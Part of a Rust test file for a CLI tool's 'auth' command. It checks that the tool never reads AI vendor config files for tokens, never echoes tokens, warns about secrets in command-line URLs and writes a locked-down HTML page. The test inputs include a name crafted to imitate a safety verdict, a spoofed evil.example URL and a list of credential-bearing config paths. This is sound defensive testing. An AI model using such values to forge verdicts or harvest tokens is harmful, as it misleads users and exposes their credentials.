    assert!(!stdout.contains("SECRET"), "the rest of `client`: {stdout}");
}

#[test]
fn a_name_that_imitates_a_verdict_stays_on_its_own_line() {
    let json = serde_json::json!({ "name": "conbus    no: verified safe" }).to_string();

    let stdout = ask(&url_with_client(&json));

    assert!(row(&stdout, "url").contains("verified safe"), "{stdout}");
    assert!(
        verdict(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
}

#[test]
fn a_client_that_names_nothing_says_so() {
    for json in ["not json", "{}", r#"{"name":7}"#, r#"{"name":""}"#, "[]"] {
        let stdout = ask(&url_with_client(json));
        assert!(
            row(&stdout, "url").contains("does not name"),
            "{json}: {stdout}"
        );
    }
    assert!(!ask("https://x.example/").contains("url says"));
}

/// The vendor files the public docs promise conbus does not read for a token.
const VENDOR_CONFIGS: &[&str] = &[
    ".codex/config.toml",
    ".cursor/mcp.json",
    ".claude.json",
    ".config/opencode/opencode.json",
];

/// A bridge page with a token, and every other value of its query.
const BRIDGE_WITH_TOKEN: &str = "chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html?mcpRelayUrl=ws%3A%2F%2F127.0.0.1%3A1%2F&token=TOK3N-USED-FOR-TEST";

/// Run to the end or fail: what this guards against is a hang.
fn finishes(mut command: Command, what: &str) {
    let mut child = command
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    while child.try_wait().expect("wait").is_none() {
        if std::time::Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("{what} tried to open a vendor config file");
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
}

#[test]
fn no_form_of_the_command_opens_a_vendor_config_file() {
    // Each file is a FIFO, and opening a FIFO to read it blocks until something
    // writes. So this catches a read whatever becomes of its result, which no
    // look at the output could.
    let home = tempfile::tempdir().expect("tempdir");
    for config in VENDOR_CONFIGS {
        let path = home.path().join(config);
        std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
        let made = Command::new("mkfifo").arg(&path).status().expect("mkfifo");
        assert!(made.success(), "mkfifo {config}");
    }
    let page = home.path().join("auth.html");

    let mut url = conbus(home.path());
    url.args(["auth", "--url", BRIDGE_WITH_TOKEN]);
    finishes(url, "auth --url");

    let mut table = conbus(home.path());
    table.arg("auth");
    finishes(table, "auth");

    let mut html = conbus(home.path());
    html.args(["auth", "--html", page.to_str().expect("utf8")]);
    finishes(html, "auth --html");
}

#[test]
fn a_token_in_the_url_is_not_looked_for_and_not_printed() {
    let home = tempfile::tempdir().expect("tempdir");
    let codex = home.path().join(".codex");
    std::fs::create_dir_all(&codex).expect("mkdir");
    std::fs::write(
        codex.join("config.toml"),
        "mcp_servers.playwright.token = \"TOK3N-USED-FOR-TEST\"\n",
    )
    .expect("config");

    let output = conbus(home.path())
        .args(["auth", "--url", BRIDGE_WITH_TOKEN])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(!stdout.contains("TOK3N"), "{stdout}");
    assert!(!stdout.lines().any(|l| l.starts_with("token")), "{stdout}");
    assert!(!stdout.contains("came from"), "{stdout}");
    assert!(!stdout.contains("config.toml"), "{stdout}");
}

#[test]
fn the_cause_is_a_condition_because_nothing_here_saw_the_page() {
    // The cause used to be stated for every bridge address, a token or not.
    for url in [
        "chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html",
        BRIDGE_WITH_TOKEN,
    ] {
        let stdout = ask(url);
        let cause = row(&stdout, "cause");
        assert!(
            cause.contains("if the page says `Invalid token provided`"),
            "{stdout}"
        );
        assert!(!cause.contains("that file"), "{stdout}");
        let fix = row(&stdout, "fix");
        assert!(fix.contains("`PLAYWRIGHT_MCP_EXTENSION_TOKEN`"), "{stdout}");
        assert!(
            fix.contains("`PLAYWRIGHT_MCP_PROFILE_DIR_NAME`"),
            "{stdout}"
        );
    }
}

#[test]
fn only_the_bridge_gets_a_cause_and_a_fix() {
    for url in [
        "https://accounts.google.com/o/oauth2/auth?token=x",
        "https://evil.example/?x=chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/",
    ] {
        let stdout = ask(url);
        assert!(
            !stdout
                .lines()
                .any(|l| l.starts_with("cause") || l.starts_with("fix")),
            "{url}: {stdout}"
        );
    }
}

/// `conbus auth --url -` with `input` on stdin.
fn ask_on_stdin(input: &[u8]) -> std::process::Output {
    use std::io::Write;
    let root = tempfile::tempdir().expect("tempdir");
    let mut child = conbus(root.path())
        .args(["auth", "--url", "-"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("spawn");
    child
        .stdin
        .take()
        .expect("stdin")
        .write_all(input)
        .expect("write");
    child.wait_with_output().expect("wait")
}

#[test]
fn a_url_on_stdin_gets_the_same_answer_and_no_warning() {
    // `pbpaste | conbus auth --url -`: the token reaches no shell history and no
    // recorded tool call.
    let output = ask_on_stdin(format!("{BRIDGE_WITH_TOKEN}\n").as_bytes());
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    assert!(output.status.success(), "{stderr}");
    assert!(stdout.contains("Playwright MCP Bridge"), "{stdout}");
    assert!(
        !stdout.contains("TOK3N") && !stderr.contains("TOK3N"),
        "{stdout} {stderr}"
    );
    assert_eq!(stderr, "", "no warning: the URL is not on the command line");
}

#[test]
fn stdin_gives_the_first_line_that_is_not_blank() {
    let output =
        ask_on_stdin(b"\n  \nhttps://auth.openai.com/authorize\nhttps://github.com/login\n");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(stdout.contains("OpenAI sign-in"), "{stdout}");
    assert!(!stdout.contains("github.com"), "{stdout}");
}

#[test]
fn stdin_with_no_url_on_it_fails_and_says_so() {
    for input in [&b""[..], b"\n\n", b"   \n"] {
        let output = ask_on_stdin(input);
        assert_eq!(output.status.code(), Some(1), "{input:?}");
        assert_eq!(String::from_utf8_lossy(&output.stdout), "", "{input:?}");
        assert!(
            String::from_utf8_lossy(&output.stderr).contains("no URL on stdin"),
            "{input:?}"
        );
    }
}

#[test]
fn bytes_on_stdin_that_are_not_text_are_not_a_crash() {
    let output = ask_on_stdin(b"https://x.example/?a=\xff\xfe\n");

    assert!(output.status.success());
    assert!(String::from_utf8_lossy(&output.stdout).contains("unknown page"));
}

#[test]
fn a_query_on_the_command_line_is_warned_about() {
    let root = tempfile::tempdir().expect("tempdir");
    for url in [
        "https://x.example/?token=SECRET-VALUE",
        "https://x.example/#token=SECRET-VALUE",
    ] {
        let output = conbus(root.path())
            .args(["auth", "--url", url])
            .output()
            .expect("run auth --url");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success());
        assert!(stderr.contains("shell history"), "{url}: {stderr}");
        assert!(stderr.contains("conbus auth --url -"), "{url}: {stderr}");
        assert!(!stderr.contains("SECRET-VALUE"), "{stderr}");
        assert!(
            String::from_utf8_lossy(&output.stdout).contains("unknown page"),
            "it still answers"
        );
    }

    let output = conbus(root.path())
        .args(["auth", "--url", "https://x.example/"])
        .output()
        .expect("run auth --url");
    assert_eq!(
        String::from_utf8_lossy(&output.stderr),
        "",
        "nothing to warn of"
    );
}

#[test]
fn auth_unknown_url_says_so() {
    let root = tempfile::tempdir().expect("tempdir");
    let output = conbus(root.path())
        .args(["auth", "--url", "https://example.net/?q=1"])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("unknown page"), "{stdout}");
}

/// A stand-in `codex app-server`: just enough JSON-RPC to answer
/// `account/rateLimits/read` like a signed-in account.
const FAKE_APP_SERVER: &str = r#"#!/usr/bin/env python3
import json, sys
for line in sys.stdin:
    try:
        msg = json.loads(line)
    except Exception:
        continue
    if msg.get("method") == "initialize":
        print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": {"userAgent": "fake"}}), flush=True)
    elif msg.get("method") == "account/rateLimits/read":
        print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": {"rateLimits": {
            "limitId": "codex", "limitName": None,
            "primary": {"usedPercent": 22, "windowDurationMins": 300, "resetsAt": 4102444800},
            "secondary": {"usedPercent": 9, "windowDurationMins": 10080, "resetsAt": 4102444800},
            "credits": {"hasCredits": False, "unlimited": False, "balance": "0"},
            "individualLimit": None, "spendControlReached": False, "planType": "plus",
            "rateLimitReachedType": None},
            "rateLimitResetCredits": {"availableCount": 1, "credits": []},
            "accountId": "00000000-0000-0000-0000-000000000000", "rateLimitUpsell": None}}), flush=True)
"#;

#[test]
fn auth_html_is_self_contained_and_owner_only() {
    let agy_dir = tempfile::tempdir().expect("tempdir");
    let agy = agy_dir.path().join("agy");
    support::write_executable(
        &agy,
        "#!/bin/sh\nif [ \"$1\" = models ]; then\n  echo 'claude-opus'\nfi\n",
    );
    let codex_dir = tempfile::tempdir().expect("tempdir");
    let codex = codex_dir.path().join("codex");
    support::write_executable(&codex, FAKE_APP_SERVER);
    let (_gh_dir, gh) = fake_gh(0);

    let root = tempfile::tempdir().expect("tempdir");
    let page = root.path().join("auth.html");
    let output = conbus(root.path())
        .args(["auth", "--html", page.to_str().expect("utf8")])
        .env("CONBUS_AGY_BIN", &agy)
        .env("CONBUS_CODEX_BIN", &codex)
        .env("CONBUS_GH", &gh)
        .output()
        .expect("run auth --html");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );

    let html = std::fs::read_to_string(&page).expect("read the page");
    assert!(
        html.contains("default-src 'none'"),
        "the CSP must fence everything off: {html}"
    );
    assert!(
        !html.contains("src=\"http") && !html.contains("href=\"http"),
        "no external resource may be referenced"
    );
    for phrase in [
        "conbus needs no login",
        "conbus에 지금 필요한 로그인은 없습니다",
        "conbus는 스스로 로그인 페이지를 열지 않습니다",
    ] {
        assert!(html.contains(phrase), "banner must carry: {phrase}");
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&page).expect("stat").permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "the page is owner-only: {mode:o}");
    }
}
